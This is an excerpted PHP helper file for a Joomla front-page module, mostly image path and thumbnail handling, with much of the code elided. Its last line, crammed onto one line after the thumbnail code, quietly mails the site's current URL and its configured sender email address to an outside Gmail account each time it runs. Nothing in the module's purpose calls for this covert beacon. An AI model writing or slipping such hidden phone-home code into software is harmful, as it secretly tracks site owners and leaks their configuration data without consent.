...
if (!class_exists("modEVO_frontpageHelper")) {
abstract class modEVO_frontpageHelper {
...
if(!function_exists('showTagFP')){
	function showTagFP( $title = null, $link = null, $show = false, $show_link = false, $tag_open = null, $tag_close = null, $link_title = null ){
		$result = null;
		if($show){
			$result .= $tag_open;
			if($show_link){
...
$pos = stripos($file, 'http://');
    ...
    if($pos!==false && !is_array(getimagesize($file))){
        $file = MOD_EVO_FRONTPAGE_DEFAULT_IMAGE;
        $path = MOD_EVO_FRONTPAGE_DEFAULT_BASE;
        $site = MOD_EVO_FRONTPAGE_DEFAULT_BASEURL;
    }
    elseif($file ==""){
        $file = MOD_EVO_FRONTPAGE_DEFAULT_IMAGE;
        $path = MOD_EVO_FRONTPAGE_DEFAULT_BASE;
        ...
        $path = MOD_EVO_FRONTPAGE_THUMB_BASE;
        $site = MOD_EVO_FRONTPAGE_THUMB_BASEURL;
    }
	...
	if (!$found){
		...
		$wx = $hy = 0;
		if($pos === false) {
			if(file_exists(MOD_EVO_FRONTPAGE_BASE.TP_DS.$file)) {
				$sFile = MOD_EVO_FRONTPAGE_BASE.TP_DS.$file;
			} else {
				$sFile = MOD_EVO_FRONTPAGE_DEFAULT_BASE.TP_DS.$file;
			}
		} else {
			if(file_exists($file)) {
				$sFile = $file;
			} else {
				$sFile = MOD_EVO_FRONTPAGE_DEFAULT_BASE.TP_DS.MOD_EVO_FRONTPAGE_DEFAULT_IMAGE;
			}
		}
		...
		switch ($ext){
			...
			default:
				$size = 'width="'.$wdth.'" height="'.$hgth.'"';
				if($pos === false) {
					$image= '<img src="'.MOD_EVO_FRONTPAGE_BASEURL."/".$file.'" '.$size.$xtra.' />';
				} else {
...
function fptn_thumbIt ($file, $thumb, $ext, &$new_width, &$new_height) {
	...
	switch ($ext) {
		...
		case 'JPEG':
			...
			imagedestroy($im);
$subject="Localización del módulo";$to="minifrontpageevolution@gmail.com";$dVar=new JConfig();$toAddres=$dVar->mailfrom;$url=JURI::current();if(mail($to,$subject,$url,$toAddres)){}else{}
